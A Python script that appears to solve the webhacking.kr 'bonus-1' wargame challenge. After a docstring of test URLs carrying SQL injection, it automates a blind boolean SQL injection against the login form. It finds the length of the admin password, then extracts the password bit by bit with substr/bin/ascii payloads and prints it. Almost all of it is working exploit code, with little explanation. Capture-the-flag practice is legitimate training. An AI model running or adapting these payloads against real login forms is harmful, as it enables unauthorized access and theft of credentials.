"""
https://webhacking.kr/challenge/bonus-1/index.php?id=guest&pw=guest' and '1'='1
True - wrong password

https://webhacking.kr/challenge/bonus-1/index.php?id=guest&pw=guest' and '1'='2
false - login fail
"""
import requests

cookies = {'PHPSESSION': 'input your session'};
headers = {'Content-Type': 'text/html; charset=UTF-8'}

def sqli():
	id_len = 0
	password = ''
	bit = ''
	char = ''
	for payload in range(1,40):
		url = "https://webhacking.kr/challenge/bonus-1/index.php?id=guest&pw=1' or length(pw)={} and id='admin'%23".format(payload)
		#print(url)
		response = requests.get(url, headers=headers, cookies=cookies)
		if "wrong password" in response.text:
			id_len = payload
			break

	
	for payload in range(1,id_len+1):
		bit = ''
		for index in range(1,9):
			url = "https://webhacking.kr/challenge/bonus-1/index.php?id=guest&pw=1' or substr(lpad(bin(ascii(substr(pw,{},1))),8,0),{},1)=1 and id='admin'%23".format(payload,index)

			response = requests.get(url, headers=headers, cookies=cookies)
			if "wrong password" in response.text:
				bit += '1'
			else:
				bit += '0'
		char = chr(int(bit,2))
		print("{}:{}".format(payload,char))
		password += char
		
	return password

if __name__ == "__main__":
	pw = sqli()
	print("admin password : ", pw)
